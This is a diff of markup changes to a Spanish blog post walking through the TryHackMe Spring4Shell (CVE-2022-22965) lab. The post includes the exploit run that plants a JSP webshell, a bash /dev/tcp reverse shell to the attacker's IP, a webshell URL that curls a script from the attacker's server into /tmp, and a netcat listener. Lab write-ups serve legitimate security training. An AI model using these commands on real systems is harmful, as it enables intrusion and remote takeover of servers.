@@ -1,4 +1,4 @@
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/spring4shell/inicio.png" />
 </p>
 
@@ -7,15 +7,15 @@ En esta ocasión vamos a hablar de la maquina <strong>Spring4shell</strong>.</p>
 
 <p><a href="https://tryhackme.com/">TryHackMe</a> lanzó hace unas semanas esta máquina para aprender acerca de una de las vulnerabilidades más sonadas del momento.</p>
 
-<p>El impacto de la vulnerabilidad asciende al nivel de que, <a href="https://backtrackacademy.com/articulo">piratas informáticos</a> sacaron provecho de este acontecimiento para ejecutar el malware de botnet MIRAI en Singapur, descargando el programa malicioso en la carpeta <code class="highlighter-rouge">/tmp</code> y ejecutarlo, luego de un cambio de permisos bajo el comando <code class="highlighter-rouge">chmod</code>.</p>
+<p>El impacto de la vulnerabilidad asciende al nivel de que, <a href="https://backtrackacademy.com/articulo">piratas informáticos</a> sacaron provecho de este acontecimiento para ejecutar el malware de botnet MIRAI en Singapur, descargando el programa malicioso en la carpeta <code class="language-plaintext highlighter-rouge">/tmp</code> y ejecutarlo, luego de un cambio de permisos bajo el comando <code class="language-plaintext highlighter-rouge">chmod</code>.</p>
 
 <p>Vamos a ver un poco de la vulnerabilidad, limitaciones, explotación y remediaciones.</p>
 
 <h2 id="vulnerabilidad">VULNERABILIDAD</h2>
 
-<p>En marzo de 2022 se hace <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22965">pública</a> la vulnerabilidad de <strong>ejecución remota de comandos</strong> en el marco de Java Spring, específicamente en <code class="highlighter-rouge">Spring Cloud Functions</code> y <code class="highlighter-rouge">Spring Core</code>, generando un gran impacto en el framework.</p>
+<p>En marzo de 2022 se hace <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22965">pública</a> la vulnerabilidad de <strong>ejecución remota de comandos</strong> en el marco de Java Spring, específicamente en <code class="language-plaintext highlighter-rouge">Spring Cloud Functions</code> y <code class="language-plaintext highlighter-rouge">Spring Core</code>, generando un gran impacto en el framework.</p>
 
-<p>El mundo de <strong>Spring Framework</strong> presenta una vulnerabilidad de ejecución remota de comandos, a través de una <em>webshell</em> la cual es posible luego de forzar a escribir un archivo de extensión <code class="highlighter-rouge">.jsp</code> en el servidor web.</p>
+<p>El mundo de <strong>Spring Framework</strong> presenta una vulnerabilidad de ejecución remota de comandos, a través de una <em>webshell</em> la cual es posible luego de forzar a escribir un archivo de extensión <code class="language-plaintext highlighter-rouge">.jsp</code> en el servidor web.</p>
 
 <p>El principal <strong>riesgo</strong> de el éxito en la explotación de esta vulnerabilidad se presenta en el potencial <em>escalamiento de privilegios</em> para lograr un acceso total al servidor víctima y a la infraestructura de la organización afectada por el ataque.</p>
 
@@ -95,11 +95,11 @@ Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 
 <p>En el navegador accedemos a la IP bajo el puerto 8080 y procedemos a descargar el archivo <strong>exploit.zip</strong>.</p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/spring4shell/exploitzip.png" />
 </p>
 
-<p>Movemos el archivo a nuestra carpeta y procedemos a descomprimir el archivo con la utilidad <code class="highlighter-rouge">unzip</code>.</p>
+<p>Movemos el archivo a nuestra carpeta y procedemos a descomprimir el archivo con la utilidad <code class="language-plaintext highlighter-rouge">unzip</code>.</p>
 
 <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">mv</span> ~/Descargas/firefox/exploit.zip <span class="nb">.</span>
 ❯ unzip exploit.zip
@@ -114,30 +114,30 @@ Archive:  exploit.zip
 
 <p>Procedemos a ver el funcionamiento del script.</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
-<span class="n">usage</span><span class="p">:</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="p">[</span><span class="o">-</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">f</span> <span class="n">FILENAME</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">p</span> <span class="n">PASSWORD</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">d</span> <span class="n">DIRECTORY</span><span class="p">]</span> <span class="n">url</span>
-<span class="n">exploit</span><span class="o">.</span><span class="n">py</span><span class="p">:</span> <span class="n">error</span><span class="p">:</span> <span class="n">the</span> <span class="n">following</span> <span class="n">arguments</span> <span class="n">are</span> <span class="n">required</span><span class="p">:</span> <span class="n">url</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">python3</span> <span class="n">exploit</span><span class="p">.</span><span class="n">py</span>
+<span class="n">usage</span><span class="p">:</span> <span class="n">exploit</span><span class="p">.</span><span class="n">py</span> <span class="p">[</span><span class="o">-</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">f</span> <span class="n">FILENAME</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">p</span> <span class="n">PASSWORD</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="n">d</span> <span class="n">DIRECTORY</span><span class="p">]</span> <span class="n">url</span>
+<span class="n">exploit</span><span class="p">.</span><span class="n">py</span><span class="p">:</span> <span class="n">error</span><span class="p">:</span> <span class="n">the</span> <span class="n">following</span> <span class="n">arguments</span> <span class="n">are</span> <span class="n">required</span><span class="p">:</span> <span class="n">url</span>
 </code></pre></div></div>
 
 <p>Ahora ejecutamos el script con la URL victima (<em>FILENAME</em>, <em>PASSWORD</em> y <em>DIRECTORY</em> son opcionales).</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.25.142</span><span class="o">/</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">python3</span> <span class="n">exploit</span><span class="p">.</span><span class="n">py</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">25.142</span><span class="o">/</span>
 <span class="n">Shell</span> <span class="n">Uploaded</span> <span class="n">Successfully</span><span class="err">!</span>
-<span class="n">Your</span> <span class="n">shell</span> <span class="n">can</span> <span class="n">be</span> <span class="n">found</span> <span class="n">at</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.25.142</span><span class="o">/</span><span class="n">tomcatwar</span><span class="o">.</span><span class="n">jsp</span><span class="err">?</span><span class="n">pwd</span><span class="o">=</span><span class="n">thm</span><span class="o">&amp;</span><span class="n">cmd</span><span class="o">=</span><span class="n">whoami</span>
+<span class="n">Your</span> <span class="n">shell</span> <span class="n">can</span> <span class="n">be</span> <span class="n">found</span> <span class="n">at</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">25.142</span><span class="o">/</span><span class="n">tomcatwar</span><span class="p">.</span><span class="n">jsp</span><span class="err">?</span><span class="n">pwd</span><span class="o">=</span><span class="n">thm</span><span class="o">&amp;</span><span class="n">cmd</span><span class="o">=</span><span class="n">whoami</span>
 </code></pre></div></div>
 
 <p>Como indica la salida del script, la webshell ha sido cargada en el servidor con éxito, por lo tanto, ya tenemos la <strong>capacidad</strong> de ejecutar comandos de manera remota.</p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/spring4shell/vulnerable.png" />
 </p>
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/spring4shell/intrusion.png" />
 </p>
 
 <p>Ahora vamos a subir una <strong>reverseshell</strong> para ganar acceso a la maquina!</p>
 
-<p>Crearemos un archivo <code class="highlighter-rouge">shell.sh</code>.</p>
+<p>Crearemos un archivo <code class="language-plaintext highlighter-rouge">shell.sh</code>.</p>
 
 <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nano shell.sh
 
@@ -151,13 +151,13 @@ bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.9.3
 Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
 </code></pre></div></div>
 
-<p>Ejecutaremos en el navegador la siguiente <strong>URL</strong> para cargar nuestra shell en la carpeta <code class="highlighter-rouge">/tmp</code> de la víctima.</p>
+<p>Ejecutaremos en el navegador la siguiente <strong>URL</strong> para cargar nuestra shell en la carpeta <code class="language-plaintext highlighter-rouge">/tmp</code> de la víctima.</p>
 
 <ul>
   <li>http://10.10.25.142/tomcatwar.jsp?pwd=thm&amp;cmd=curl http://10.9.3.40:8000/shell.sh -o /tmp/shell.sh</li>
 </ul>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/spring4shell/shell.png" />
 </p>
 
@@ -175,7 +175,7 @@ listening on <span class="o">[</span>any] 1234 ...
   <li>http://10.10.25.142/tomcatwar.jsp?pwd=thm&amp;cmd=bash /tmp/shell.sh</li>
 </ul>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/spring4shell/admin.png" />
 </p>
 
@@ -206,7 +206,7 @@ root@spring4shell:/# <span class="nb">head</span> <span class="nt">-c</span> 10 
 
 <p><strong>¡Ya está!</strong></p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/spring4shell/finish.png" />
 </p>
 
